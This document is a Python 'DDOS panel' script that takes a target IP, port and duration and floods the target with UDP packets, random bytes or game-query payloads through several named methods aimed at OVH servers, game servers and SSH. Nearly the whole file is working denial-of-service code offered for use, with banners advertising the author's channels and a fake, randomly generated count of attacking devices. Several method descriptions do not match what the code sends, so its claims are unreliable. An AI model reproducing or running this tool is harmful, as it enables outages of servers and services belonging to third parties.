#!/usr/bin/env python3
#-*- coding: utf-8 -*-
import sys
import socket
import time
import random
import threading
import getpass
import os
import urllib
import json

nicknm = "esfelurm"

methods = """\033[00;32m
 ('-. .-.    ('-.                 _ (`-.  
( OO )  /  _(  OO)               ( (OO  ) 
,--. ,--. (,------.  ,--.       _.`     \ 
|  | |  |  |  .---'  |  |.-')  (__...--'' 
|   .|  |  |  |      |  | OO )  |  /  | | 
|       | (|  '--.   |  |`-' |  |  |_.' | 
|  .-.  |  |  .--'  (|  '---.'  |  .___.' 
|  | |  |  |  `---.  |      |   |  |      
`--' `--'  `------'  `------'   `--'      

\033[01;33m[ LAYER - 4 ] 

\033[01;31m[\033[00;32m–\033[01;31m]\033[00;36m.DNS : \033[00;32mMultiple Amplification Methods
\033[01;31m[\033[00;32m–\033[01;31m]\033[00;36m.OVHTCP : \033[00;32mTCP OVH Interno Bypass
\033[01;31m[\033[00;32m–\033[01;31m]\033[00;36m.OVHUDP : \033[00;32mUDP OVH Game Bypass
\033[01;31m[\033[00;32m–\033[01;31m]\033[00;36m.FIVEM : \033[00;32mGame Flood Optimized For FM
\033[01;31m[\033[00;32m–\033[01;31m]\033[00;36m.TCP : \033[00;32mTCP Socket Flood and SYN-ACK
\033[01;31m[\033[00;32m–\033[01;31m]\033[00;36m.NFO : \033[00;32mSYN Flood + Raw UDP + Handshake
\033[01;31m[\033[00;32m–\033[01;31m]\033[00;36m.R6DROP : \033[00;32mGame Flood Optimized For R6
\033[01;31m[\033[00;32m–\033[01;31m]\033[00;36m.RNDROP : \033[00;32mGame Flood Optimized For FN
\033[01;31m[\033[00;32m–\033[01;31m]\033[00;36m.SSH-DOWN : \033[00;32mSSH V1/1.1/2 Flood

\033[01;31m[\033[00;32m+\033[01;31m]\033[00;36m Ex : .DNS [ IP ] [ PORT ] [ TIME ]
 """



banner =  """\033[00;32m
                                                                 
                                                                 
                          :=*##%%%%#*+=:                         
                       .+%@@@@@@@@@@@@@@%#-                      
                    .-=%@@@@@@@@@@@@@@@%%#*#=                    
                   .#=@@@@@@@@@@@@@@@@@@@@%*==                   
                   **%@@@@@@@@@@@@@@@@@@@@@@%-                   
                   %%@@@@@@@@@@@@@@@@@@@@@@@@%.                  
              .    @@@@@@@@@@@@@@@@@@@@@@@@@@@=   .              
             :+    #@@@@@@@@@@@@@@@@@@@@@@@@@@-   :+             
            .%=    -@@%-...:=*%@@@@#+-:..:+%@%    .@+            
            #@+     *@%       -@@@#       -%%:    .@@-           
           -@@#     .@%      .#@@@@=      -@*     -%@#           
           *@@@:    -@@:   :*%@%-*@@#=.   #@#     #@@@.          
           *@@@%.   .%@%##%@@@%.  +@@@@%#%@@+    +@@@@.          
           -@@@@#.   .*%@%@@@@#:+-=@@@@@%%#=    =@@@@#           
            *@@@@%:      +@@@@@@@@@@@@@%       *@@@@%.           
             *@@@@%+      +@@@@@@@@@@@%.     -%@@@@%:            
              -%@@@@%=.    =#:%-@***-#.    :#@@@@@*              
                =%@@@@%*:     + #-.-    .=%@@@@%*:               
                  -*%@@@@%+:    :    .-*%@@@@#=.                 
                     -*%@@@@%+-   .=#%@@@@#+:                    
                   -+=. :=#%@@@%#%@@@@#+-..-+=.                  
                  #@#   .-=++++#%@@@@#+-:.  =@%:                 
              .:-=%@%#%@@@%#*=:  .:=+*#%@@%##@@*-:.              
          :+#%@@@@@@@%-:.               .:-*@@@@@@@@%*=.         
        :%@@@@@@#+=.+%#-:               .:+%*::+*%@@@@@%=        
        +@@@*-        ..                  .        .=%@@%        
        .++-                                         :++-        
                                                                 
                                                                 
\033[01;31mChannel Telegram and Github : @Esfelurm
\033[00;36mHello, welcome to DDOS panel \nTo attack or see information, type the word \033[01;31m"help" \033[00;36mand press enter 
"""
cookie = open(".sinfull_cookie","w+")

fsubs = 0
tpings = 0
pscans = 0
liips = 0
tattacks = 0
uaid = 0
said = 0
running = 0
iaid = 0
haid = 0
aid = 0
attack = True
ldap = True
http = True
atks = 0

def randsender(host, timer, port, punch):
	global iaid
	global aid
	global tattacks
	global running

	timeout = time.time() + float(timer)
	sock = socket.socket(socket.AF_INET, socket.IPPROTO_IGMP)

	iaid += 1
	aid += 1
	tattacks += 1
	running += 1
	while time.time() < timeout and ldap and attack:
		sock.sendto(punch, (host, int(port)))
	running -= 1
	iaid -= 1
	aid -= 1


def stdsender(host, port, timer, payload):
	global atks
	global running

	timeout = time.time() + float(timer)
	sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
	
	atks += 1
	running += 1
	while time.time() < timeout and attack:
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
	atks -= 1
	running -= 1

def main():
	global fsubs
	global tpings
	global pscans
	global liips
	global tattacks
	global uaid
	global running
	global atk
	global ldap
	global said
	global iaid
	global haid
	global aid
	global attack
	global dp

	while True:
		bots = (random.randint(32500,41500))
		sys.stdout.write(f"\x1b]2; DDOSER | Devices: [{bots}] | Spoofed Servers [19] | Server Units [8] | Clients: [18]\x07")
		sin = input("\033[01;31m┌──(root@ddos)-[/panel]  \n└─# \033[00;36m ")
		sinput = sin.split(" ")[0]
		if sinput == "clear":
			os.system ("clear")
			print (banner)
			main()
		elif sinput == "help":
			os.system ("clear")
			print (methods)
			main()
		elif sinput == "exit":
			os.system ("clear")
			exit()
		elif sinput == ".ovhtcp":
			try:
				if running >= 1:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x73\x74\x64\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[1;37;40mSuccessfully broadcast to all \033[31mYou \033[37mservers...")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == ".dns":
			try:
				if running >= 999:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[97mSuccessfully broadcast to all \033[31mYou \033[37mservers...")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == ".ovhudp":
			try:
				if running >= 999:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
						sinput, host, timer, port = sin.split(" ")
						socket.gethostbyname(host)
						payload = b"\x00\x02\x00\x2f"
						threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
						print("\033[97mSuccessfully broadcast to all \033[31mYou \033[37mServer...")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == ".sshdown":
			try:
				if running >= 999:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
						sinput, host, timer, port = sin.split(" ")
						socket.gethostbyname(host)
						payload = b"\xff\xff\xff\xffTSource Engine Query\x00"
						threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
						print("\033[97mSuccessfully broadcast to all \033[31mYou \033[37mservers...")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == ".fivem":
			try:
				if running >= 991:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
						sinput, host, timer, port = sin.split(" ")
						socket.gethostbyname(host)
						payload = b"\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58"
						threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
						print("\033[97mSuccessfully broadcast to all \033[31mYou \033[37mservers...")
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == ".nfo":
			try:
				if running >= 999:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 10000
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print("\033[97mSuccessfully broadcast to all \033[31mYou \033[37mservers...")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == ".tcp":
			try:
				if running >= 991:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 2048
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print("\033[97mSuccessfully sent attack to all \033[31mYou \033[37mservers...")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == ".rndrop":
			try:
				if running >= 999:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 50000
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print("\033[97mSuccessfully broadcast to all \033[31mYou \033[37mservers...")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == ".r6drop":
			try:
				if running >= 1:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 1460
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print("\033[97mSuccessfully broadcast to all \033[31mYou \033[37mservers...")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "stopattacks":
			attack = False
			while not attack:
				if aid == 0:
					attack = True
		elif sinput == "stop":
			attack = False
			while not attack:
				if aid == 0:
					attack = True

		else:
			main()


try:
	clear = "clear"
	os.system(clear)
	print(banner)
	main()
except KeyboardInterrupt:
	exit()

